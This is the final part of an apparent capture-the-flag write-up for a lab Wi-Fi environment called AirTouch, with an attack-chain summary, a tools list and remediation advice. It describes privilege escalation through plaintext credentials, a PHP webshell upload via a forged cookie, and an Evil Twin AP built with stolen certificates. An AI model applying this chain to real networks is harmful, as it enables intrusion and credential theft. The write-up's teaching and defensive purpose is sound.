### 9.1 SSH with Credentials from send_certs.sh

```bash
root@AirTouch-Consultant:~# ssh remote@10.10.10.1
```

```
The authenticity of host '10.10.10.1 (10.10.10.1)' can't be established.
ECDSA key fingerprint is SHA256:<REDACTED>
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.1' (ECDSA) to the list of known hosts.
remote@10.10.10.1's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

remote@AirTouch-AP-MGT:~$
```

We're now on the management AP host (`AirTouch-AP-MGT`) — the RADIUS/EAP server backing the `AirTouch-Office` network.

### 9.2 Reading the hostapd-wpe EAP User Database

```bash
remote@AirTouch-AP-MGT:/etc/hostapd$ cat hostapd_wpe.eap_user
```

The file is the standard `hostapd-wpe` user database template, with the operative (non-comment) entries at the bottom:

```
# WPE - DO NOT REMOVE - These entries are specifically in here
*               PEAP,TTLS,TLS,FAST

*       PEAP,TTLS,TLS,FAST [ver=1]

"AirTouch\<REDACTED_USERNAME>"                           MSCHAPV2            "<REDACTED_PASSWORD>" [2]
"admin"                                 MSCHAPV2                "<REDACTED_PASSWORD>" [2]
```

This file — used by the legitimate RADIUS server to validate EAP/MSCHAPv2 logins — contains **plaintext credentials for an `admin` account** in addition to the previously cracked user's credentials.

### 9.3 Escalating to admin

```bash
remote@AirTouch-AP-MGT:/etc/hostapd$ su admin
```
```
Password:
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@AirTouch-AP-MGT:/etc/hostapd$
```

### 9.4 Final Privilege Escalation to root

```bash
admin@AirTouch-AP-MGT:/etc/hostapd$ sudo -l
```
```
Matching Defaults entries for admin on AirTouch-AP-MGT:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on AirTouch-AP-MGT:
    (ALL) ALL
    (ALL) NOPASSWD: ALL
```

```bash
admin@AirTouch-AP-MGT:/etc/hostapd$ sudo -i
root@AirTouch-AP-MGT:~#
```

### 9.5 Root Flag

```bash
root@AirTouch-AP-MGT:~# cat root.txt
```
```
<REDACTED_ROOT_FLAG>
```

---

## 10. Attack Chain Summary

| Stage | Host | Technique | Result |
|-------|------|-----------|--------|
| 1 | AirTouch-Consultant | UDP scan exposed SNMP (`public` community) leaking a plaintext default password in the system description | SSH access as `consultant` |
| 1 | AirTouch-Consultant | `sudo -l` showed unrestricted NOPASSWD sudo | Root on the consultant box (attack platform) |
| 2 | — | Used `eaphammer`/aircrack-ng suite to capture & crack the `AirTouch-Internet` WPA2-PSK handshake | Recovered Wi-Fi passphrase |
| 3 | AirTouch-AP-PSK (192.168.3.1) | Joined `AirTouch-Internet`, found router web UI, used a privileged session cookie to upload a PHP webshell | RCE as `www-data` |
| 3 | AirTouch-AP-PSK | Read `login.php` source for hardcoded app credentials; SSH'd in and abused unrestricted sudo | Root on the router; found `certs-backup/` (incl. private key) and `send_certs.sh` (leaked creds for `10.10.10.1`) |
| 4 | — | Imported stolen legitimate certs into `eaphammer`; stood up an Evil Twin AP impersonating `AirTouch-Office` (WPA-Enterprise) | Captured a domain user's MSCHAPv2 challenge/response |
| 4 | — | Cracked the MSCHAPv2 hash with John + rockyou.txt | Recovered plaintext domain credentials |
| 5 | — | Legitimately joined `AirTouch-Office` using the cracked domain credentials | Network access to `10.10.10.0/24` (the management segment) |
| 6 | AirTouch-AP-MGT (10.10.10.1) | SSH'd in using the leaked `remote` credentials from `send_certs.sh` | Shell as `remote` |
| 6 | AirTouch-AP-MGT | Read `hostapd_wpe.eap_user`, exposing a plaintext `admin` password | Escalated to `admin` via `su` |
| 6 | AirTouch-AP-MGT | `admin` had unrestricted NOPASSWD sudo | Root, root flag captured |

---

## 11. Tools Used

- `nmap` — TCP/UDP port and service scanning, host discovery
- `snmpwalk`/Nmap NSE (`snmp-info`, `snmp-sysdescr`) — SNMP enumeration
- `eaphammer` — rogue AP creation, certificate import, Evil Twin WPA-Enterprise attacks, hostapd-wpe wrapper
- `airmon-ng`, `airodump-ng`, `aireplay-ng`, `aircrack-ng` — wireless monitoring, handshake capture, deauthentication, WPA2-PSK cracking
- `wpa_supplicant`, `dhclient` — joining WPA2-PSK and WPA-Enterprise networks as a client
- `curl` — interacting with the web application/webshell over an SSH tunnel
- `ssh` (with `-L` port forwarding) — pivoting into isolated network segments
- `sshpass` (found in target script) — used by the target's own automation, leaking credentials
- `John the Ripper` — cracking the captured NetNTLM/MSCHAPv2 hash

---

## 12. Key Takeaways / Remediation

1. **Credentials Leaked via SNMP:** A default password for the `consultant` account was exposed in plaintext through the SNMP system description (`sysDescr`) using the well-known `public` community string. SNMP should use SNMPv3 with authentication/encryption, and sensitive data should never be embedded in system banners.
2. **Excessive, Unrestricted sudo Across Multiple Hosts:** Nearly every compromised host (`consultant`, `user` on AirTouch-AP-PSK, `admin` on AirTouch-AP-MGT) had unrestricted, passwordless `sudo` access, turning any single foothold into instant root. Sudo rules should be scoped to the minimum commands necessary for each role.
3. **Weak WPA2-PSK Passphrase:** The `AirTouch-Internet` network's passphrase was crackable via a standard wordlist (`rockyou.txt`) against a captured 4-way handshake. WPA2/WPA3-PSK networks should use long, high-entropy passphrases resistant to dictionary attacks, and consider WPA3-SAE where supported.
4. **Hardcoded Application Credentials & Authorization Bypass:** The router's `login.php` contained hardcoded user credentials directly in source, and the upload functionality could apparently be reached/escalated using a forged `UserRole=admin` cookie value rather than a properly validated, server-side session role check. Authorization state should never be trusted from client-supplied cookies; role checks must be enforced server-side against a verified session.
5. **Stolen Certificate/Key Material Enables Evil Twin Attacks:** Because the legitimate RADIUS server's private key and certificate chain were stored insecurely (`certs-backup/`, synced via an unencrypted credential-bearing shell script), an attacker could stand up a perfectly trusted rogue AP for `AirTouch-Office`, harvesting real domain credentials from auto-connecting clients. Private keys for EAP/RADIUS servers must be tightly access-controlled, never embedded in backup scripts with plaintext companion credentials, and rotated immediately if exposure is suspected.
6. **Plaintext Credentials in Configuration Files:** `hostapd_wpe.eap_user` stored the `admin` account's password in plaintext for MSCHAPv2 validation purposes, and was readable by a lower-privileged `remote` user. Where plaintext storage is unavoidable for protocol reasons (e.g., MSCHAPv2's need for the original password or NT hash), file permissions must restrict access strictly to the service account running the RADIUS daemon.
7. **Credential & Secret Reuse Across the Environment:** Multiple stages of this chain were only possible because credentials and secrets (a password leaked via SNMP, a private key plus a separate plaintext password embedded together in a sync script, an admin password readable from a config file) were reused or co-located insecurely. Centralizing secrets in a proper secrets manager, with unique non-reused credentials per system, would have broken this chain at several points.

---

*Flags and other sensitive values have been redacted. IP addresses replaced with placeholders (`10.129.xx.xx` for the primary target, `10.10.xx.xx` for attacker/VPN); internal lab network ranges (`192.168.3.0/24`, `10.10.10.0/24`) reflect addressing internal to the challenge environment and are left as-is for chain clarity.*
